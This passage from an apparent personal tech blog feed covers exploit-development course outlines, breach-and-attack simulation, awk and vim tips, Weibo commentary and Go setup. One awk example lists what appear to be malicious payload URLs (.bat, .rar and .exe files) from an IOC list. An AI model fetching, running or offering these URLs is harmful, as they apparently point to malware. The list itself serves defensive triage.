    <content type="html"><![CDATA[<p>中级班课程目录</p><p>一、溢出利用<br>1、平台演示<br>2、exp代码框架、SHELLCODE编写<br>3、溢出通道对抗防火墙<br>4、异常链表对抗堆栈COOKIES保护技术<br>5、溢出跳转、兼容技术<br>6、堆溢出利用<br>7、溢出程序跟踪调试<br>8、一些典型溢出漏洞分析<br>9、RPC编程简单介绍<br>10、RPC的漏洞利用<br>11、一些典型的RPC漏洞分析<br>12、更多的利用代码包括RPC漏洞利用代码<br>二、漏洞挖掘<br>1、漏洞研究<br>2、数据流挖掘技术<br>3、FUZZ技术<br>4、关键API、系统特性<br>5、内核漏洞挖掘和利用技术<br>三、总结提高<br>1、前面内容的一些补充<br>2、高级DVE对抗技术<br>3、xp挑战赛对抗360沙箱技术</p><p>高级班课程目录</p><p>一、溢出利用<br>1、平台演示<br>2、exp代码框架、SHELLCODE编写<br>3、溢出通道对抗防火墙<br>4、异常链表对抗堆栈COOKIES保护技术<br>5、溢出跳转、兼容技术<br>6、堆溢出利用<br>7、溢出程序跟踪调试<br>8、一些典型溢出漏洞分析，更多一些<br>9、RPC编程简单介绍<br>10、RPC的漏洞利用<br>11、一些典型的RPC漏洞分析<br>12、更多的利用代码包括RPC漏洞利用代码，比中级班再更多<br>二、漏洞挖掘<br>1、漏洞研究<br>2、数据流挖掘技术<br>3、FUZZ<br>4、关键API、系统特性<br>5、内核漏洞挖掘和利用技术<br>6、RPC漏洞的挖掘<br>7、RPC漏洞挖掘的小工具<br>三、总结提高<br>1、前面内容的一些补充<br>2、高级DVE对抗技术<br>3、xp挑战赛对抗360沙箱技术<br>4、调试技术<br>5、安全模型和安全本质理解</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secstudy</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secstudy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>secops_bas</title>
    <link href="/2024/12/26/security/secops/secops_bas/"/>
    <url>/2024/12/26/security/secops/secops_bas/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>入侵和攻击模拟（BAS）</p><p>BAS是一种先进的信息安全技术，它通过模拟真实的攻击场景来评估和提高组织的网络安全防御能力。与传统的渗透测试和漏洞管理工具相比，BAS有着显著的不同之处。传统的渗透测试通常是由安全团队执行的一系列预先计划好的攻击行动，旨在发现系统中的漏洞并评估其严重性。而BAS则更加动态和全面，它不仅模拟攻击行为，还模拟了数据泄露的过程。这使得BAS能够更加真实地反映出安全防御在实际攻击面前的反应和表现。</p><p>BAS的攻击模拟是持续进行的，它不会只在特定时间进行一次性的测试，而是像持续的网络安全监控一样运行。BAS能够及时地检测和评估组织对于新出现的威胁的防御能力。使用BAS的目的是为了确保安全措施能够在不断变化的威胁环境中有效运作。这种模拟攻击可以验证安全策略、检测潜在的弱点，并提供实时反馈，帮助组织改善其安全防御。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secops</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secops</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>weibo_video_download</title>
    <link href="/2024/12/26/yunwei/yunweitips/weibo_video_download/"/>
    <url>/2024/12/26/yunwei/yunweitips/weibo_video_download/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>微博中存在部分视频内容由于设置无法直接下载</p><h2 id="下载步骤"><a href="#下载步骤" class="headerlink" title="下载步骤"></a>下载步骤</h2><p>1、edge观看视频，右击“检查”，查看网络-&gt;媒体，复制对应的链接</p><p><img src="/image-20241226101057449.png" alt="image-20241226101057449"></p><p>2、直接访问复制的链接，会返回 403 </p><p><img src="/image-20241226101211385.png" alt="image-20241226101211385"></p><p>3、增加referer后可以正常访问</p><p><img src="/image-20241226101304944.png" alt="image-20241226101304944"></p><p>4、右击视频，点击“另存视频为”即可下载视频</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>delete_file_null_line</title>
    <link href="/2024/12/25/yunwei/yunweitips/delete_file_null_line/"/>
    <url>/2024/12/25/yunwei/yunweitips/delete_file_null_line/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h3><p>brew install coreutils 安装</p><h3 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a>vim命令</h3><p>进入vim，输入以下命令删除空行</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:g/^</span><span class="hljs-variable">$/</span>d<br></code></pre></td></tr></table></figure><h3 id="sublime"><a href="#sublime" class="headerlink" title="sublime"></a>sublime</h3><p><strong>mac</strong></p><p>1、option+command+F 打开查找和替换窗口</p><p>2、查找框输入 ^\n</p><p>^ 表示行的开头</p><p>\n 表示换行符</p><p>3、替换框确保为空</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweitips</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweitips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>awk</title>
    <link href="/2024/12/25/yunwei/yunweicommands/awk/"/>
    <url>/2024/12/25/yunwei/yunweicommands/awk/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><h3 id="分割字符串"><a href="#分割字符串" class="headerlink" title="&#x2F; 分割字符串"></a>&#x2F; 分割字符串</h3><p>需要对多行URL的文本切割，输出域名，输出下标从1开始</p><p>cat filename.txt | awk -F ‘&#x2F;‘ ‘{print $3}’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://umeay.com/名单.bat<br>https://qqfnmasqq.bond/电子普票.rar<br>https://ehfof.shop/查阅8080.exe<br><br>➜  内网安全 <span class="hljs-built_in">cat</span> yhioc20241225.txt| awk -F <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span><br>umeay.com<br>qqfnmasqq.bond<br>ehfof.shop<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweicommands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>yunweicommands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tk_group_message</title>
    <link href="/2024/12/24/informationCocoon/tk_group_message/"/>
    <url>/2024/12/24/informationCocoon/tk_group_message/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2024-12-23"><a href="#2024-12-23" class="headerlink" title="2024.12.23"></a>2024.12.23</h2><h3 id="砂糖橘不能吃的微博解读"><a href="#砂糖橘不能吃的微博解读" class="headerlink" title="砂糖橘不能吃的微博解读"></a>砂糖橘不能吃的微博解读</h3><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>砂糖橘不能吃的微博</p><h4 id="TK解读"><a href="#TK解读" class="headerlink" title="TK解读"></a>TK解读</h4><p>首先，这条微博是在咋呼。但又不能说他在撒谎。</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/27A87621-AECA-4D9C-8CC1-B3D136380408.png" alt="27A87621-AECA-4D9C-8CC1-B3D136380408"></p><p>他把nature那篇论文和别的一些东西揉到一起说了</p><p>这条微博在引流技巧的使用上是是教科书式的。因为</p><p>nature那篇论文我之前看过，讲的是果糖被转换为几种脂质后，可以被肿瘤细胞利用。</p><p>但如果一上来讲这个，很多人一看就脑子涨。</p><p>所以你们看，这条微博从头到尾没提具体细节，就是果糖、肿瘤。大家都能看懂。</p><p>但光是果糖、肿瘤，也还不够</p><p>但“砂糖橘真的不能再吃了”这就很到位</p><p>果糖、肿瘤这些词对一些人来说也会导致脑子涨。但“砂糖橘真的不能再吃了”这种句子大家都喜闻乐见。</p><p>虽然说使用脱酸剂的是柑橘类水果，但“柑橘类水果”这几个字就不如“沙糖桔”来的厉害。</p><p>所以，那条微博是精心设计的引流文。每个地方都不是随便写的。</p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tk_wb_blog</title>
    <link href="/2024/12/24/informationCocoon/tk_wb_blog/"/>
    <url>/2024/12/24/informationCocoon/tk_wb_blog/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h1><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018.1.29"></a>2018.1.29</h2><p>“保持好奇心”这个说法暗示了好奇心是一种先天的、易失的东西。如果现在有，必须努力保持才不会失去；而如果现在没有，就永远不会有。 </p><p><a href="https://weibo.com/1401527553/4201572646302667">https://weibo.com/1401527553/4201572646302667</a></p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224145809209.png" alt="image-20241224145809209"></p><h2 id="2018-6-17"><a href="#2018-6-17" class="headerlink" title="2018.6.17"></a>2018.6.17</h2><p>兴趣是产生自驱力的源头，但光靠兴趣无法维持自驱力。能为自驱力源源不断提供能量的必然是更强大的东西：好奇心和野心。 </p><p><a href="https://weibo.com/1401527553/4255510397959170">https://weibo.com/1401527553/4255510397959170</a></p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224150044001.png" alt="image-20241224150044001"></p><h2 id="2018-6-23"><a href="#2018-6-23" class="headerlink" title="2018.6.23"></a>2018.6.23</h2><p>最近有好几个毕业生问我关于 Offer 选择的问题——你可以问我某家公司在某个领域是什么情况，也可以问我某个技术方向好不好，但我不知道你是谁，不知道你是什么性格，不知道你是什么水平，不知道你家庭情况如何，我对你完全不了解，也不可能通过你几句话介绍就能了解，我也没有对发 Offer 的这几家公司做过调研分析，怎么可能知道什么选择适合你呢？</p><p>大学毕业的时候，我收到了 4 个 Offer。那时候我对安全行业了解很少，对这些公司更不了解。于是我花了数天时间，先把这些公司的网站都仔细看了，然后又搜索了这些公司的相关新闻，最后筛选出一南一北两家公司。我无法根据网上能看到的信息进一步判断，于是我坐火车去这两家公司分别看了一下，最后根据亲眼所见的情况做出了选择。后来事实证明我的选择的是对的。</p><p>2014 年换工作的时候，我收到了 5 个 Offer。这时候我虽然对安全行业比较了解，对这些公司也比较了解，但人到中年，这种重大决定仍然是不能轻易做的。所以我非常认真地从各个角度这些公司进行了调研，包括打听详细的内部规章制度，甚至找做了多个投资的朋友问他们对这些公司未来发展情况的判断。</p><p>为什么股市里散户干不过机构？因为散户看看网上的消息听听别人的忽悠就把自己多年辛苦的积蓄扔进去了。而机构是要实地调研的，要看一系列数据的。人生第一份工作非常重要，因为这是你第一次要把自己投资进去，所以必须自己下功夫。让别人帮自己做判断，就和听消息炒股的散户一样。</p><p><img src="/image-20250110201602541.png" alt="image-20250110201602541"></p><p><a href="https://weibo.com/1401527553/GmFKPb88C">https://weibo.com/1401527553/GmFKPb88C</a></p><h1 id="2022"><a href="#2022" class="headerlink" title="2022"></a>2022</h1><h2 id="2022-9-28"><a href="#2022-9-28" class="headerlink" title="2022.9.28"></a>2022.9.28</h2><p>有人想不通贾跃亭为什么到今天还要造车。</p><p>贾跃亭必须造车。普京必须打乌克兰。乾隆必须凑十全武功。这个用咱们过日子人的心去想是想不明白的。</p><p>好大喜功和雄才伟略之间的区别主要是干没干成。没干成就是好大喜功，干成了就是雄才伟略。</p><p>所以前面的例子只能举到乾隆。因为十全武功虽然凑成了，但比较勉强。后世夸得少，笑的多。所以说乾隆好大喜功不会有很多人反对。要是举了秦皇汉武的例子，挨骂的就是我了。我们从来不用“好大喜功”形容成功者。</p><p>其实，如果一个人不“好大喜功”，或者用现代词儿说叫“强烈的成就动机”，又怎么能做成大事呢？靠狗屎运吗？所以，单单“好大喜功”其实没什么不对。成功人士都好大喜功。</p><p>当然，说“好大喜功”等于“雄才伟略”其实也不对。“好大喜功”只对应了“伟略”。有伟略，还得有雄才。那么，即便最后没成，大家也认为是时也运也命也，不至于给个好大喜功的评价。诸葛亮五次北伐都没搞成，后人也不说他好大喜功，只说他鞠躬尽瘁。</p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224150406643.png" alt="image-20241224150406643"></p><p><a href="https://weibo.com/6827625527/4818648269064364">https://weibo.com/6827625527/4818648269064364</a></p><h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="2023-4-12"><a href="#2023-4-12" class="headerlink" title="2023.4.12"></a>2023.4.12</h2><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/007s41inly1hwvrayrmu0j30u011i7aq.jpg" alt="img"></p><h1 id="2024"><a href="#2024" class="headerlink" title="2024"></a>2024</h1><h2 id="2024-5-7"><a href="#2024-5-7" class="headerlink" title="2024.5.7"></a>2024.5.7</h2><p><a href="https://weibo.com/6827625527/5031372701569943">https://weibo.com/6827625527/5031372701569943</a></p><p>我所在的某个群，里面主要是文艺工作者和科技工作者，以文艺工作者为主。搞书画的，搞雕塑的，搞音乐的，搞建筑的，搞时装的，主持人，作家，导演，啥都有。科技工作者从院士、科技企业家到我这样的小虾米，也是啥都有。</p><p>虽然这种群里大家说话不会太直接，不过还是可以感觉到气氛和社会主流思潮不太一样。他们就像所有时间所有空间的大多数艺术家和知识分子，真实的一面不怎么讨人喜欢。或者说，“脱离群众”。</p><p>有人问一个导演：你的那个作品在国内能上吗？导演说：等通知吧。</p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224112629346.png" alt="image-20241224112629346"></p><p>。。。。。</p><p>。。。。。</p><h2 id="2024-6-13"><a href="#2024-6-13" class="headerlink" title="2024.6.13"></a>2024.6.13</h2><p>你们有没有发现国内一些大模型的测评分数跟使用感受差别很大？看测评的话，编程能力普遍都超过 70 分。其中有些确实不错，但也有的感觉连 48.1 分的 GPT-3.5 都不如。最糟糕的一个甚至连某个 Python 模块能干什么不能干什么都搞不清楚。不知道是不是又发挥了擅于跑分的特长，搞了针对性优化。</p><p><img src="/image-20241230101316269.png" alt="image-20241230101316269"></p><p><a href="https://weibo.com/6827625527/5044845913835326">https://weibo.com/6827625527/5044845913835326</a></p><h2 id="2024-10-6"><a href="#2024-10-6" class="headerlink" title="2024.10.6"></a>2024.10.6</h2><p>我有一个自己的大模型测试集。其实就是设定了一系列结果可验证的任务。比如：推理一个函数的执行结果、写一个能完成某任务的程序、分析一个故事中的人物关系、找出一段描写中使用不当的形容词、给出一个电路某两点之间的电压，等等。</p><p>所以，在和一些没怎么使用过大模型的朋友讨论大模型的时候，大家往往会惊讶于我对一些模型的评价，并表示”某某模型在某某测试中排名很靠前啊！“</p><p>在大模型问题上，大家也不要忘了，咱们最擅长的就是“跑分”，或者叫“测评优化”。</p><p><img src="/image-20241230101529362.png" alt="image-20241230101529362"></p><h2 id="2024-12-24"><a href="#2024-12-24" class="headerlink" title="2024.12.24"></a>2024.12.24</h2><p>美国购物网站上有些商品页面能看到这样的免责声明 :</p><p>“本产品含有加利福尼亚州已知会导致癌症和出生缺陷或其他生殖危害的化学物质。”</p><p>这是加州 65 号提案也就是《1986 年安全饮用水和有毒物质执行法案》的要求。好在国内知道的人不多，要不然用这种当证据，能把一大堆产品都打成沙糖桔。</p><p><img src="/2024/12/24/informationCocoon/tk_wb_blog/image-20241224101623194.png" alt="image-20241224101623194"></p><p><a href="https://weibo.com/6827625527/5086503290018903">https://weibo.com/6827625527/5086503290018903</a></p><h2 id="2024-12-28"><a href="#2024-12-28" class="headerlink" title="2024.12.28"></a>2024.12.28</h2><p>Linus Torvalds 并不是第一个叫 Linus 的名人。</p><p>Linus Pauling，在 1954 获得了诺贝尔化学奖，又在 1963 获得诺贝尔和平奖。历史上，独立获得两次诺贝尔奖的，仅此一人。获得过两个不同类型诺贝尔奖的，除他之外也只有一个居里夫人。</p><p>当代年轻人一般不太喜欢来自老年人的忠告。而 Linus Pauling 也曾经给年轻人忠告，让年轻人不要相信忠告：</p><p>“作为老一辈人，我想给你们一点忠告，应该怎样对待长辈。当一个年长的大人物对你说话时，认真恭敬地听，但别相信他。除了你自己的智慧，不要信任其它任何东西。一个老人，不管是白头发或者没头发，哪怕他得过诺贝尔奖，也可能是错的。你们必须永远保持怀疑，永远独立思考。”</p><p>至于 Linus Pauling 这段关于不要相信忠告的忠告到底是不是忠告，以及该不该相信这个不要相信忠告的忠告，我并不打算给你们忠告。</p><p><img src="/image-20241230111646406.png" alt="image-20241230111646406"></p><p><a href="https://weibo.com/6827625527/5116555441999662">https://weibo.com/6827625527/5116555441999662</a></p><h2 id="2024-12-29"><a href="#2024-12-29" class="headerlink" title="2024.12.29"></a>2024.12.29</h2><p>根据国家疾控中心最新一期流感监测周报，北方的流感样病例比南方严重很多。不过总体来说都比去年要轻。去年这个时候不仅比今年更严重，而且南方北方都很严重。</p><p>今年南北方流行的流感毒株基本都是 A(H1N1)pdm09。今年的三价、四价流感疫苗都覆盖了这个毒株。所以如果之前打了疫苗，应该能从中受益。</p><p>另外，除了极少数 A(H1N1)pdm09 毒株对神经氨酸酶抑制剂敏感性高度降低外，其它毒株对神经氨酸酶抑制剂和聚合酶抑制剂都敏感。简单说就是奥司他韦、玛巴洛沙韦都还好使。</p><p><img src="/image-20241230111422545.png" alt="image-20241230111422545"></p><p><a href="https://weibo.com/6827625527/5116566860203420">https://weibo.com/6827625527/5116566860203420</a></p><h2 id="2024-12-29-1"><a href="#2024-12-29-1" class="headerlink" title="2024.12.29"></a>2024.12.29</h2><p>这几天很多人都表达了对 DeepSeek 3 训练成本大幅降低的惊叹。但也有人说这是“断章取义”，比如认为他们训练的只是 FP8 精度，强调他们训练用了大量高质量合成数据，并认为得到这些数据的过程所消耗的算力也应该算在训练成本里。</p><p>看了两边的观点之后我觉得好像都有道理，而我也没有资格在这个问题上做出评价。模型训练是大玩家们的游戏。我们能关注的还是模型应用。实验室的同学已经在测试 DeepSeek 3 了，具体好不好用也还是要用了才知道。</p><p>另外，今年夏天的时候，我用我自己设定的测试任务测了一下几个大模型。国内的大模型多数都不能完成我的编程任务（<a href="https://weibo.com/6827625527/5044845913835326,https://weibo.com/6827625527/5086503290018903%EF%BC%89%E3%80%82%E5%8F%AA%E6%9C%89%E5%BD%93%E6%97%B6%E7%9A%84">https://weibo.com/6827625527/5044845913835326,https://weibo.com/6827625527/5086503290018903）。只有当时的</a> DeepSeek 2.5 和另外一个能完成。</p><p><img src="/image-20241230102036305.png" alt="image-20241230102036305"></p><p><a href="https://weibo.com/6827625527/5116900397026163">https://weibo.com/6827625527/5116900397026163</a></p><h2 id="2024-12-29-2"><a href="#2024-12-29-2" class="headerlink" title="2024.12.29"></a>2024.12.29</h2><p>我有个亲戚是机长。他曾遇到过和东方航空 5510 空难一样的引擎故障，不过那次他把飞机救回来了，平安降落。</p><p>可想而知，当时飞机肯定是忽上忽下，扭来扭去。所以乘客都在骂飞行员。但这时候又不能告诉乘客发生了什么，要不然大家一慌乱，更麻烦。降落后，乘客们知道了真相，又全都跑来感谢飞行员，感谢救命之恩。</p><p>我经常思考这件事。</p><p><img src="/image-20241230101127318.png" alt="image-20241230101127318"></p><p><a href="https://weibo.com/6827625527/5116909603263506">https://weibo.com/6827625527/5116909603263506</a></p><h2 id="2024-12-31"><a href="#2024-12-31" class="headerlink" title="2024.12.31"></a>2024.12.31</h2><p>所有 Windows 版本都通用的就是 Print Screen 截全屏以及  Alt + Print Screen 截当前窗口。Windows 10&#x2F;11 支持更高级的截屏方式，可以自选截屏区域。按 Win + Shift + S 即可启动该功能。具体可参考：<a href="https://support.microsoft.com/zh-cn/windows/%E4%BD%BF%E7%94%A8%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E6%8D%95%E8%8E%B7%E6%88%AA%E5%9B%BE-00246869-1843-655f-f220-97299b865f6b">https://support.microsoft.com/zh-cn/windows/%E4%BD%BF%E7%94%A8%E6%88%AA%E5%9B%BE%E5%B7%A5%E5%85%B7%E6%8D%95%E8%8E%B7%E6%88%AA%E5%9B%BE-00246869-1843-655f-f220-97299b865f6b</a></p><p>不过以上这些截屏方式都是把截取的内容存在剪贴板。如果希望直接把截屏存为文件，可以用 Windows 自带的 Game Bar 截屏，Win + Alt + Print Screen，截屏会自动存储到用户目录的 Videos\Captures。</p><p>另外，Game Bar 还可以录制屏幕录像，Win + Alt + R 即可启动，同样保存在用户目录的 Videos\Captures。也就是说，在 Windows 10&#x2F;11 上录制屏幕录像并不需要依赖第三方软件。</p><p><img src="/image-20250102102222115.png" alt="image-20250102102222115"></p><p><a href="https://weibo.com/6827625527/5117661363832958">https://weibo.com/6827625527/5117661363832958</a></p><h2 id="2024-12-31-1"><a href="#2024-12-31-1" class="headerlink" title="2024.12.31"></a>2024.12.31</h2><p>二战期间，大批美国妇女走出家门，参与社会生产，这是战后美国妇女解放运动的基础。新中国成立后，作为轻工业中心的上海，妇女在工厂里加班加点生产纺织产品、日化产品等物资，支援全国，从而催生了上海男人做饭的传统。</p><p>农业文明时代，女性的体力劣势是地位低下的根本原因。在这样的背景下，无论怎么争取，最多只能诞生个别的武则天和慈禧，不可能实现广泛意义的妇女解放。从目前的情况看，人工智能会进一步消除男性和女性在脑力劳动上的生产力差异，甚至更加能发挥女性语言能力强的优势。所以女性应该积极拥抱人工智能。</p><p><img src="/image-20250102102706206.png" alt="image-20250102102706206"></p><p><a href="https://weibo.com/6827625527/5117635790113673">https://weibo.com/6827625527/5117635790113673</a></p><h1 id="2025"><a href="#2025" class="headerlink" title="2025"></a>2025</h1><h2 id="2025-1-1"><a href="#2025-1-1" class="headerlink" title="2025.1.1"></a>2025.1.1</h2><p>查了一下，现在国内的肺炎链球菌对不少抗生素都耐药，对阿奇霉素等大环内酯类抗生素耐药率更是都超过 95% 了。</p><p>明年肺炎链球菌疫苗我也得去打。 </p><p><img src="/image-20250102101437659.png" alt="image-20250102101437659"></p><p><a href="https://weibo.com/6827625527/5118114278677435">https://weibo.com/6827625527/5118114278677435</a></p><h2 id="2025-1-1-1"><a href="#2025-1-1-1" class="headerlink" title="2025.1.1"></a>2025.1.1</h2><p>我很喜欢的一个作家，大概在他 30 岁的时候，就表达了这样一个观点：他明白自己人指望不了，外国人指望不上，所以他喜欢科幻，因为在科幻里至少还可以指望外星人。于是我知道在那时候他就已经杀死了自己的慈父，杀死了自己的神，成为了一个孤独而自由的人。</p><p>那时他已经比较出名，所以发出上面那个观点后很快又删掉了。之后他越来越出名，也就再没有发表过类似观点，其实是没再发表过任何观点。他只是在每部作品里巧妙地不露痕迹地不留把柄地讲着一个个故事。</p><p><img src="/image-20250102161606017.png" alt="image-20250102161606017"></p><p><a href="https://weibo.com/6827625527/P7IGArxUX">https://weibo.com/6827625527/P7IGArxUX</a></p><h2 id="2025-1-10"><a href="#2025-1-10" class="headerlink" title="2025.1.10"></a>2025.1.10</h2><p>有的公司产品质量好，服务到位，客户口碑好，那你就做它的客户。<br>有的公司待遇好，文化宽松，员工满意度高，那你就去那里工作。<br>有的公司增长稳定，财报漂亮，股东回报好，那你就买它的股票。</p><p>但只是看到产品质量好，于是激动地去投简历或者买股票，这种判断就是基于情感（及其导致的混乱思维）而非逻辑。</p><p><img src="/image-20250110201739872.png" alt="image-20250110201739872"></p><p><a href="https://weibo.com/6827625527/P8Xvk9m0G">https://weibo.com/6827625527/P8Xvk9m0G</a></p><h2 id="2025-2-15"><a href="#2025-2-15" class="headerlink" title="2025.2.15"></a>2025.2.15</h2><p>我以前存储备份小文件都是打包成 TAR 或者不压缩的 ZIP。成千上万个小文件变成一个大文件之后，拷贝速度会得到巨大提高。</p><p>不过虚拟磁盘可能是更好的办法。VHD 是 Windows 原生支持的格式，用系统自带的磁盘管理器即可创建，双击即可挂载。创建一个动态扩展的 VHD 虚拟磁盘，挂载后把小文件丢进去就行。这个办法除了不依赖第三方工具，而且对文件进行访问也很方便。</p><p><img src="/image-20250216094719968.png" alt="image-20250216094719968"></p><p><a href="https://weibo.com/6827625527/5134424874158990">https://weibo.com/6827625527/5134424874158990</a></p><h2 id="2025-2-15-1"><a href="#2025-2-15-1" class="headerlink" title="2025.2.15"></a>2025.2.15</h2><p>Windows 没有自带的创建光盘镜像的工具。不过 Windows ADK（Assessment and Deployment Kit）里有一个命令行工具 oscdimg。</p><p><img src="/image-20250216150107642.png" alt="image-20250216150107642"></p><p><a href="https://weibo.com/6827625527/5134387830066722">https://weibo.com/6827625527/5134387830066722</a></p><h2 id="2025-2-16"><a href="#2025-2-16" class="headerlink" title="2025.2.16"></a>2025.2.16</h2><p>store.rg-adguard.net 这个网站提供了获取微软应用商店程序直接下载链接的能力。</p><p>由于微软应用商店下架的程序只是“下架”，但“库存”还在，所以，即便已下架的程序，只要知道原来的网页链接，也可以用这个网站获得“库存”链接，下载到程序。 </p><p><img src="/image-20250216145853911.png" alt="image-20250216145853911"></p><p><a href="https://weibo.com/6827625527/5134617848055647">https://weibo.com/6827625527/5134617848055647</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>life_yl</title>
    <link href="/2024/12/24/life/life_yl/"/>
    <url>/2024/12/24/life/life_yl/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h3 id="流感"><a href="#流感" class="headerlink" title="流感"></a>流感</h3><p>罗氏出品-玛巴洛沙韦干混悬剂：5 岁以上都可以用</p><p>罗氏出品-速福达</p><p>来自TK茧房群</p>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
      <category>yiliao</category>
      
    </categories>
    
    
    <tags>
      
      <tag>life</tag>
      
      <tag>yiliao</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang_base</title>
    <link href="/2024/12/24/dev/golang/golang_base/"/>
    <url>/2024/12/24/dev/golang/golang_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>官方网址</p><p>go.dev&#x2F;dl&#x2F;</p><p>golang.org&#x2F;dl&#x2F;</p><h2 id="安装注意事项"><a href="#安装注意事项" class="headerlink" title="安装注意事项"></a>安装注意事项</h2><h3 id="解压到指定目录"><a href="#解压到指定目录" class="headerlink" title="解压到指定目录"></a>解压到指定目录</h3><p>源码解压到&#x2F;usr&#x2F;local</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -C /usr/local -zxvf go1.<span class="hljs-number">24</span>.<span class="hljs-number">2</span>.linux-amd64.tar.gz<br></code></pre></td></tr></table></figure><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>vim ~&#x2F;.bashrc</p><p>export GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;go</p><p>export GOPATH&#x3D;$HOME&#x2F;go</p><p>export PATH&#x3D;$PATH:$GOROOT&#x2F;bin:$GOPATH&#x2F;bin</p><p>GOROOT  go语言源码包所在位置</p><p>GOPATH   开发者GO项目的默认路径，也就是代码路径</p><h3 id="加载配置文件"><a href="#加载配置文件" class="headerlink" title="加载配置文件"></a>加载配置文件</h3><p>source ~&#x2F;.bashrc</p><h3 id="安装验证"><a href="#安装验证" class="headerlink" title="安装验证"></a>安装验证</h3><p>go -V</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -o dataanalyze dataanalyze.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="语言结构"><a href="#语言结构" class="headerlink" title="语言结构"></a>语言结构</h2><h3 id="基础组成"><a href="#基础组成" class="headerlink" title="基础组成"></a>基础组成</h3><h4 id="包声明"><a href="#包声明" class="headerlink" title="包声明"></a>包声明</h4><p>必须在非注释的第一行表明文件属于哪个包，例如：package main</p><p>package main 表示该文件是可独立执行的程序，每个Go应用程序都包含一个名为 main 的包</p><h4 id="引入包"><a href="#引入包" class="headerlink" title="引入包"></a>引入包</h4><p>import “包名”</p><p>import “fmt”，告诉程序需要使用 fmt 包，fmt 包实现了格式化IO（输入&#x2F;输出）的函数</p><p>多个包引入</p><p>import (</p><p>​“fmt”</p><p>​“time”</p><p>)</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>func 函数名()</p><p>func main()</p><p>main 函数是每个可执行程序必须包含的，也是一般情况下程序启动后第一个执行的函数（如果程序中包含 init 函数，将会先执行 init 